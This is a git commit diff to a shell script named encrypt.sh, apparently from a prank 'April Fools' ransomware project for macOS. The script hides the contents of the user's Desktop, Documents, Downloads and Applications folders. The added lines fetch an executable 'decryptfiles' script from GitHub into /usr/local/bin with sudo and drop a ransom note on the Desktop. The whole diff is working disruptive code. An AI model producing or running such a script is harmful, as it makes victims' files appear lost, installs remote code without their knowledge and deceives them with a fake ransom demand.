47f15ca553f6973178ff5637be4bf9eec0721758
FoxDev <91700492+ItsFoxDev@users.noreply.github.com>
2022-04-12 21:15:29 -0400

    Add READ ME.txt file

--- encrypt.sh
+++ encrypt.sh
@@ -1,4 +1,10 @@
+if [ ! -d "/usr/local/bin" ]; then 
+  sudo mkdir /usr/local/bin
+fi
+curl -fsSL "https://raw.githubusercontent.com/ItsFoxDev/AprilFoolsRansomware/main/decrypt.sh" -o /usr/local/bin/decryptfiles
+chmod +x /usr/local/bin/decryptfiles
 chflags hidden ~/Desktop/*
 chflags hidden ~/Documents/*
 chflags hidden ~/Downloads/*
 chflags hidden /Applications/*
+curl -fsSL "https://raw.githubusercontent.com/ItsFoxDev/AprilFoolsRansomware/main/ransommessage.txt" -o ~/Desktop/READ\ ME.txt
